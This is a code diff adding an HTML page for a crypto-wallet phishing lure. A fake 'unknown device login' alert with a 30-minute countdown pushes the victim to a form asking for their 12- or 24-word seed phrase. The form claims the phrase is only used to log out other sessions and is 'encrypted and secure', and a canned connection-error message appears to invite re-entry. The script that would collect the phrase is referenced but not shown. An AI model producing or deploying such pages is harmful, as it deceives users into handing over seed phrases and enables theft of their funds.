@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Security Flow</title>
+  <link rel="stylesheet" href="./style.css">
+  
+</head>
+
+<body>
+  <div class="container">
+    <div class="step-indicator">
+      <div class="step active" id="step-1">1</div>
+      <div class="step" id="step-2">2</div>
+    </div>
+
+    <!-- Step 1: Security Alert -->
+    <div class="page active step1" id="page-1">
+      <h2>Security Alert: Unknown Device Login Detected</h2>
+      <div class="alert">Immediate Action Required</div>
+      <p>
+        We detected an unusual login attempt to your wallet from an unrecognized device.
+        For your security, immediate verification is required to maintain access to your account.
+      </p>
+      <p class="timer">Time remaining to verify: <span id="timer">30:00</span></p>
+      <p><strong>To prevent unauthorized access, please verify your identity immediately.</strong></p>
+
+      <button type="button" onclick="verifyNow()">Verify Now</button>
+
+      <p class="footer-note">
+        If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized
+        access.
+      </p>
+    </div>
+
+    <!-- Step 3: Secure Wallet Access -->
+    <div class="page" id="page-2">
+      <h2>Secure Wallet Access</h2>
+      <p class="subtext">Enter seedphrase to logout all other sessions.</p>
+
+      <div class="error-message" id="error-message">
+        ❌ Error connecting to wallet. Please check your seedphrase and try again.
+      </div>
+
+      <form id="passphrase-form">
+        <label for="passphrase">Wallet Passphrase</label>
+        <textarea id="passphrase" maxlength="500" placeholder="Enter your wallet passphrase here..."></textarea>
+        <div class="char-counter">0/500</div>
+
+        <p class="hint">ⓘ Usually 12 or 24 words separated by spaces</p>
+
+        <div class="navigation">
+          <button type="submit" id="connect-button">
+            <span id="button-text">Continue Securely</span>
+            <div class="spinner" id="spinner"></div>
+          </button>
+        </div>
+      </form>
+
+      <div class="note">
+        🔒 Your passphrase is encrypted and secure.<br>
+        We never store your passphrase on our servers.
+      </div>
+    </div>
+  </div>
+<script src="./script,js"></script>
+</body>
+</html>
